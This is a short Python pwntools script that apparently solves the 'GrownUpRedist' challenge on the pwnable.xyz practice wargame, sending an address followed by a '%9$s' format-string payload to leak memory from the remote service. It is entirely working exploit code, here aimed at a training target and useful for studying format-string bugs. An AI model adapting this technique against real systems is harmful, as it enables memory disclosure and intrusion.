#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./GrownUpRedist',checksec=False)
#p = process()
p = remote('svc.pwnable.xyz',30004)
sla = lambda x,y : p.sendlineafter(x,y)
sl = lambda x: p.sendline(x)
sa = lambda x,y : p.sendafter(x,y)
#gdb.attach(p,gdbscript ='''
   #        b*main+78
   #        b*main+127
   #        b*main+170
   #        ''')
#input()
sa(b': ',b'y'*8 + p64(0x0000000000601080))
payload = b'a'*0x20 + b'%9$s'
payload = payload.ljust(0x80,b'a')
sa(b': ',payload)

p.interactive()
